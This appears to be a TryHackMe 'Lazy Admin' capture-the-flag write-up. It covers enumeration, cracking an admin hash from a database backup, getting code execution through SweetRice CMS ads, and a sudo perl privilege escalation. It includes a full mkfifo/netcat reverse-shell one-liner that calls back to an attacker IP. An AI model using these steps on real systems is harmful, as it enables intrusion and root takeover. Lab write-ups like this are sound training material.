# TryHackMe Lazy Admin
**Easy linux machine to practice your skills**

* After going to the ip in browser it showed just a static apache webpage. So I ran nmap and gobuster on this ip. Nmap gave port - '22', '80'. Gobuster gave us a directory named 'content'. So I ran gobuster again with content directory added this time. Command for this is '*gobuster dir -u http://<IP>/content* -w directory-list-2.3-medium.txt'. We got many sub-directories. On 'as' we have a login page. So I thought its creds should be somewhere in these above listed directories. 

* Then I moved to 'inc' and saw a folder 'mysql_backup' which contains a mysql_database_backup file. After opening it we can see below in the 'INSERT' command that we have admin as 'manager' and we have hash for the password : '42f749ade7f9e195bf475f37a44cafcb'. I used https://crackstation.net/ to crack this hash and got the password as 'Password123'. So I moved to 'as' page where there was a login page.

* It was admin panel page for SweetRice cms. I tried to find its CVE using '*searchsploit sweetrice*' and we got our exploit. There were many exploits but I chose 'PHP code execution'. Aftergoing through the exploit on https://www.exploit-db.com/exploits/40700 it was clear that we can upload our 'php reverse shell' there. The exploit description gave us the location where we can upload our shell.

* After getting the shell location as 'In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File' go to sweetrice page and click on 'Ads' section. There paste the 'php reverse shell' code in the 'Ads code' area. Change the IP to your tun0ip in the shell and upload it. tun0ip can be found using 'ifconfig'. Php reverse shell can be found on pentestmonkey. Now submit the code and go to http://<IP>/content/inc where all directories and files are listed.

* Now go to 'ads' folder and you can see our shell uploaded there. Start netcat connection on your terminal using command '*nc -lnvp port_no_specified_in_shell*' and then click on 'shell.php' in your webpage. And yes we have our shell.

* Now navigate to home directory to see the users using *ls -la /home* and we see a user named 'itguy'. Go to its directory and type 'ls -la'. You will see a 'user.txt' file. Now '*cat user.txt*' to see its content.

1. What is the user flag?<br>
Answer : THM{63e5bce9271952aad****************}

* Now type 'sudo -l' to list user privileges. We see '(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl'. So type 'cat /home/itguy/backup.pl' to see the file. It shows '#!/usr/bin/perl<br>system("sh", "/etc/copy.sh");'. So now type 'cat /etc/copy.sh' to see the file. We see that it is a reverse shell and as a user we can change it. 

* So your reverse shell should look like this : 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0ip 4444 >/tmp/f' as we saw in above step. Now in your local machine type 'nc -lnvp 4444' and run the file in your 'itguy' terminal using command '*sudo /usr/bin/perl /home/itguy/backup.pl*' which we got from 'sudo -l'. 

* We have our shell . Confirm it by typing 'whoami' and it will show root. Now type 'ls -la /root' and we see a 'root.txt' file. 'cat /root/root.txt' to see its content which is the answer to our last question.

2. What is the root flag?<br>
Answer : THM{6637f41d0177b6f37****************}